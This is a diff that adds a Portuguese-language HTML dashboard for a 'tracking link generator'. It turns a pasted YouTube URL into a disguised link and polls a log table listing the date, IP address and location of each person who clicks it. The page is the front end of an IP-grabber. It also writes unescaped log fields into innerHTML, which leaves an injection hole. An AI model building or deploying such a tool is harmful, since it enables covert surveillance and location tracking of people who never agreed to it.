@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>🔗 Gerador de Link de Rastreamento</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <script>
+        async function gerarLink() {
+            const youtubeUrl = document.getElementById("youtube-url").value;
+            const res = await fetch('/gerar_link', {
+
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ youtube_url: youtubeUrl })
+            });
+
+            const data = await res.json();
+            if (data.link) {
+                document.getElementById("link-gerado").innerText = data.link;
+                document.getElementById("link-area").style.display = "block";
+            }
+        }
+
+        async function carregarLogs() {
+            const res = await fetch("/get_logs");
+            const logs = await res.json();
+            const tbody = document.getElementById("log-tbody");
+            tbody.innerHTML = "";
+
+            logs.forEach(log => {
+                const row = `<tr>
+                    <td>${log.date}</td>
+                    <td>${log.ip}</td>
+                    <td>${log.location}</td>
+                    <td>${log.id}</td>
+                </tr>`;
+                tbody.innerHTML += row;
+            });
+        }
+
+        setInterval(carregarLogs, 5000);
+        window.onload = carregarLogs;
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>🔗 Gerar Link de Rastreamento</h1>
+        <div class="gerador">
+            <input id="youtube-url" type="text" placeholder="Cole o link do vídeo do YouTube">
+            <button onclick="gerarLink()">Gerar Link</button>
+        </div>
+
+        <div id="link-area" style="display:none;">
+            <h3>LINK GERADO</h3>
+            <p id="link-gerado"></p>
+        </div>
+
+        <h2>📍 IPs e Localizações</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th>Data</th>
+                    <th>IP</th>
+                    <th>Localização</th>
+                    <th>ID do Link</th>
+                </tr>
+            </thead>
+            <tbody id="log-tbody"></tbody>
+        </table>
+    </div>
+</body>
+</html>
